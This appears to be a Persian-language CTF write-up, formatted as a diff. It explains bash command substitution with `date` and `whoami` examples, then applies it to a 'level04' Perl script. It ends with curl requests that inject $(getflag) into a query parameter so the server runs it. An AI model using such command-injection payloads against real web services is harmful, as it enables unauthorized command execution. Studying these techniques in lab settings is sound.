@@ -1,0 +1,70 @@
+Command substitution یعنی چی؟
+
+command substitution (فرانسه: substitution de commande) یعنی:
+
+به شل بگی «اول این دستور رو اجرا کن، بعد خروجیش رو بذار همین‌جا» — انگار که خروجی رو با دست تایپ کرده باشی.
+
+دو تا نحوه‌ی نوشتنش هست و هر دو دقیقاً یه کار می‌کنن:
+
+`cmd` (با backtick — سبک قدیمی)
+$(cmd) (سبک جدید و خواناتر)
+مثال ساده
+
+فرض کن می‌خوای بنویسی «today is» و بعدش تاریخ امروز. دستور date تاریخ رو می‌ده. بنویسی:
+
+bash
+echo today is $(date)
+
+شل این مراحل رو طی می‌کنه:
+
+مرحله ۱: $(date) را می‌بیند → اول دستور date را اجرا می‌کند
+مرحله ۲: date برمی‌گرداند مثلاً: Fri Oct 30 15:10:00 CET 2026
+مرحله ۳: آن خروجی را جای $(date) می‌گذارد
+مرحله ۴: حالا دستور نهایی این است:
+         echo today is Fri Oct 30 15:10:00 CET 2026
+
+خروجی: today is Fri Oct 30 15:10:00 CET 2026
+
+می‌بینی؟ $(date) ناپدید شد و جاش نتیجه‌ی اجرای date نشست. این همون جایگزینی (substitution) ـه.
+
+یه مثال دیگه تا جا بیفته
+bash
+echo "I am $(whoami)"
+whoami اسم کاربر فعلی رو می‌ده (مثلاً level04)
+خروجی: I am level04
+ربطش به level04 🎯
+
+تو اسکریپت Perl این بود:
+
+perl
+print `echo $y 2>&1`;
+
+حالا اگه $y (همون ورودیِ ما) برابر `getflag` باشه، شلِ سرور این رو می‌بینه:
+
+bash
+echo `getflag` 2>&1
+
+و طبق قانون command substitution:
+
+مرحله ۱: `getflag` را می‌بیند → اول getflag را اجرا می‌کند (با مجوز flag04!)
+مرحله ۲: getflag برمی‌گرداند: Check flag. Here is your token: xxxxx
+مرحله ۳: آن را جای `getflag` می‌گذارد
+مرحله ۴: echo Check flag. Here is your token: xxxxx  →  چاپ می‌شود
+
+
+چرا هم backtick هم $(...)؟
+
+هر دو یه کارن، ولی:
+
+$(...) خواناتره و می‌تونی تودرتوش کنی: $(echo $(date))
+`...` قدیمی‌تره و تودرتو کردنش سخته
+
+
+
+
+curl 'localhost:4747/level04.pl?x=$(getflag)'
+
+
+curl "localhost:4747/level04.pl?x=\$(getflag)"
+
+
